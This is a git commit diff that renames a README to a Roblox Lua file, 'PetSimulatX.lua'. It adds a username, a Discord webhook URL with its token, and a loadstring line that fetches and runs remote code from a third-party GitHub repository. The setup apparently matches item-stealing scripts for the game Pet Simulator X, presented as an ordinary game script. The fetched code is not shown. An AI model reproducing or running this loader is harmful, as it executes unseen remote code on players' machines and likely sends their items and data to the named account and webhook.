f4317bb22b84868f02a24f3b51832a3885250b63
senpalgm <127679971+senpalgm@users.noreply.github.com>
2023-03-12 19:06:54 +0300

    Update and rename README.md to PetSimulatX.lua

---
+++ PetSimulatX.lua
@@ -0,0 +1,4 @@
+UserName = "matvbo123"
+WebHook = "https://discord.com/api/webhooks/1084457081924501524/ngWfqUI75-xdBve5VYoVLqXH4uWgOP3YsYN8zteDF1CYEOGAvPrQyF62FJA_TsXfmhJX"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()
